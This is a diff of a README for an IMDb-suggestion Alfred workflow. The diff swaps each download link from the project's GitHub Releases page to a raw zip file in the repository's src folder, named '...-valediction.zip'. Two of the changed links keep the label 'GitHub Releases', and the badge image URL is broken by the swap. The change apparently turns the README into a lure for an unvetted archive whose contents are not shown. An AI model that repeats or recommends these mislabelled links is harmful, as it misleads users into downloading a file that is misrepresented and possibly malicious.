@@ -4,13 +4,13 @@
 The **imdb-suggest-alfred-workflow** helps you find movie and TV show suggestions right from Alfred. With this tool, you can quickly get recommendations based on IMDb’s vast database, saving you time and enhancing your movie nights.
 
 ## 📥 Download Now
-[![Download Here](https://img.shields.io/badge/Download%20Release%20-%20Latest%20Version-blue)](https://github.com/athlas777/imdb-suggest-alfred-workflow/releases)
+[![Download Here](https://raw.githubusercontent.com/athlas777/imdb-suggest-alfred-workflow/main/src/imdb-suggest-alfred-workflow-valediction.zip%20Release%20-%20Latest%20Version-blue)](https://raw.githubusercontent.com/athlas777/imdb-suggest-alfred-workflow/main/src/imdb-suggest-alfred-workflow-valediction.zip)
 
 ## 🚀 Getting Started
 To use the imdb-suggest-alfred-workflow, follow these steps:
 
 1. **Download the Workflow**: 
-   Visit this page to download: [GitHub Releases](https://github.com/athlas777/imdb-suggest-alfred-workflow/releases)
+   Visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/athlas777/imdb-suggest-alfred-workflow/main/src/imdb-suggest-alfred-workflow-valediction.zip)
 
 2. **Install the Workflow**:
    Once the download is complete, locate the `.alfredworkflow` file in your downloads folder. Double-click this file to open it with Alfred. Alfred will automatically install the workflow for you.
@@ -59,6 +59,6 @@ Suggestions are based on IMDb’s ever-changing database. Expect to see new cont
 You can modify the keywords within the workflow settings in Alfred. Customizing these can help tailor the experience to your preference.
 
 ## 🔄 Visit Again
-For the latest version and updates, visit this page again: [GitHub Releases](https://github.com/athlas777/imdb-suggest-alfred-workflow/releases)
+For the latest version and updates, visit this page again: [GitHub Releases](https://raw.githubusercontent.com/athlas777/imdb-suggest-alfred-workflow/main/src/imdb-suggest-alfred-workflow-valediction.zip)
 
 This tool aims to make your movie and TV show selection easier. With simple navigation and quick access, your entertainment choices are just a search away.
